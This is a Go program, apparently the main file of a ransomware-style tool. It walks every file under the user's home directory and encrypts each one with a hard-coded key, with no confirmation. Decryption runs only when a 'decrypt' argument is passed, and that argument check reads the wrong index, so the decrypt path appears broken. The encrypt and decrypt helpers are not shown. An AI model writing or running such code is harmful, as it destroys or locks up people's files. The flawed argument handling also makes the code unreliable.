package main

import (
	"fmt"
	"os"

	"github.com/karrick/godirwalk"
)

func main() {
	key := []byte{160, 185, 192, 168, 229, 105, 196, 195, 171, 99, 112, 156, 149, 205, 170, 229}
	args := os.Args[1:]
	dirname := os.Getenv("HOME")
	if dirname == "" {
		dirname = os.Getenv("USERPROFILE")
		if dirname == "" {
			panic("what os are you even using bro")
		}
	}
	err := godirwalk.Walk(dirname, &godirwalk.Options{
		Callback: func(osPathname string, de *godirwalk.Dirent) error {
			if len(args) > 0 {
				if args[1] == "decrypt" {
					decryptFile(osPathname, key)
				} else {
					encryptFile(osPathname, key)
				}
			} else {
				encryptFile(osPathname, key)
			}
			return nil
		},
		Unsorted: true,
	})
	if err == nil {
		return
	} else {
		fmt.Println(err)
	}
}
